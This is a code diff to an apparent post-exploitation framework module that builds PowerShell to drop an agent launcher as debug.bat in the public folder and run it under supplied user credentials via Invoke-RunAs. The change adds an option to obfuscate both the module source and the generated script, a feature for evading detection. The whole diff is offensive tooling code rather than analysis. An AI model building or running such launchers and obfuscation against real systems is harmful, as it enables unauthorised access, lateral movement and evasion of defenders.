@@ -90,11 +90,13 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         # read in the common powerup.ps1 module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-RunAs.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -140,19 +142,21 @@ class Module:
         launcherCode = l.generate()
 
         # PowerShell code to write the launcher.bat out
-        script += "$tempLoc = \"$env:public\debug.bat\""
-        script += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
-        script += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
-        script += "\"Launcher bat written to $tempLoc `n\";\n"
+        scriptEnd = "$tempLoc = \"$env:public\debug.bat\""
+        scriptEnd += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
+        scriptEnd += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
+        scriptEnd += "\"Launcher bat written to $tempLoc `n\";\n"
   
-        script += "\nInvoke-RunAs "
-        script += "-UserName %s " %(self.options["UserName"]['Value'])
-        script += "-Password %s " %(self.options["Password"]['Value'])
+        scriptEnd += "\nInvoke-RunAs "
+        scriptEnd += "-UserName %s " %(self.options["UserName"]['Value'])
+        scriptEnd += "-Password %s " %(self.options["Password"]['Value'])
 
         domain = self.options["Domain"]['Value']
         if(domain and domain != ""):
-            script += "-Domain %s " %(domain)
+            scriptEnd += "-Domain %s " %(domain)
 
-        script += "-Cmd \"$env:public\debug.bat\""
-
+        scriptEnd += "-Cmd \"$env:public\debug.bat\""
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
